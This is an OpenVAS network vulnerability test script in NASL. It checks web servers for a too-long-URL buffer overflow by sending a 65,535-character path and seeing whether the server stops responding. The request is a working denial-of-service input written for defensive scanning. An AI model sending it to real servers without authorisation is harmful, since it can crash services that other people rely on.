###################################################################
# OpenVAS Network Vulnerability Test
#
# WWW Too Long URL
#
# LSS-NVT-2009-004
#
# Developed by LSS Security Team <http://security.lss.hr>
#
# Copyright (C) 2009 LSS <http://www.lss.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public
# License along with this program. If not, see
# <http://www.gnu.org/licenses/>.
###################################################################

include("revisions-lib.inc");
tag_summary = "Remote web server is vulnerable to the too long URL vulnerability. It might be
possible to gain remote access using buffer overflow.";

tag_solution = "Upgrade vulnerable web server to latest version.";

if (description) {

    script_id(102004);
    script_version("$Revision: 15 $");
    script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
    script_tag(name:"creation_date", value:"2009-06-23 09:27:52 +0200 (Tue, 23 Jun 2009)");
    script_cve_id("CVE-2000-0002", "CVE-2000-0065", "CVE-2000-0571", "CVE-2001-1250", "CVE-2003-0125", "CVE-2003-0833", "CVE-2006-1652", "CVE-2004-2299", "CVE-2002-1003", "CVE-2002-1012", "CVE-2002-1011", "CVE-2001-0836", "CVE-2005-1173", "CVE-2002-1905", "CVE-2002-1212", "CVE-2002-1120", "CVE-2000-0641", "CVE-2002-1166", "CVE-2002-0123", "CVE-2001-0820", "CVE-2002-2149");
    script_name("www too long url");

    desc = "
    Summary:
    " + tag_summary + "
    Solution:
    " + tag_solution;
    script_description(desc);
    script_tag(name:"cvss_base", value:"10.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
    script_tag(name:"risk_factor", value:"Critical");
    script_summary("Tries a buffer overflow attack on vulnerable servers");

    script_category(ACT_DENIAL);
    script_family("Buffer overflow");

    script_copyright("Copyright (C) 2009 LSS");
    script_require_ports("Services/www", 80);

    if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
      script_tag(name : "solution" , value : tag_solution);
      script_tag(name : "summary" , value : tag_summary);
    }
    exit(0);
}


include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);
if(http_is_dead(port:port))exit(0);

#send a long url through the http port
req = string("/", crap(65535));
req = http_get(item:req, port:port);
http_send_recv(port:port, data:req);

#ret_code == 0, http up
#ret_code == 1, http down
ret_code = http_is_dead(port:port, retry:2);

if (ret_code == 1){
    #setting kb_item for other plugins
    set_kb_item(name:"www/too_long_url_crash", value:TRUE);
    security_hole(port);
}
else {
    exit(0);
}
